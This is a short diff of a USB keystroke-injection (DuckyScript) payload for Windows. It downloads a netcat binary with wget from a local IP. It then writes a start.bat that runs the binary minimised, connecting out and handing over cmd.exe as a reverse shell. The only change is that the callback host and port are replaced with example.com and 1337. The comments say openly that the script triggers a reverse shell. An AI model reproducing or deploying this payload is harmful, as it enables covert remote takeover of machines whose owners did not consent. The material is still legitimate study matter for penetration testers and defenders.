@@ -10,7 +10,7 @@ STRING cd / & mkdir System & cd System & echo (wget 'http://172.16.64.1:8000/nc.
 ENTER
 DELAY 1000
 REM [creates start.bat which triggers the reverse shell]
-STRING echo START /MIN a.exe t.angelparliament.com 4444 -e cmd.exe -d ^& exit > start.bat
+STRING echo START /MIN a.exe example.com 1337 -e cmd.exe -d ^& exit > start.bat
 ENTER
 DELAY 100
 REM [creates three lines of commands in a script file telling the start.bat file to run in the background]
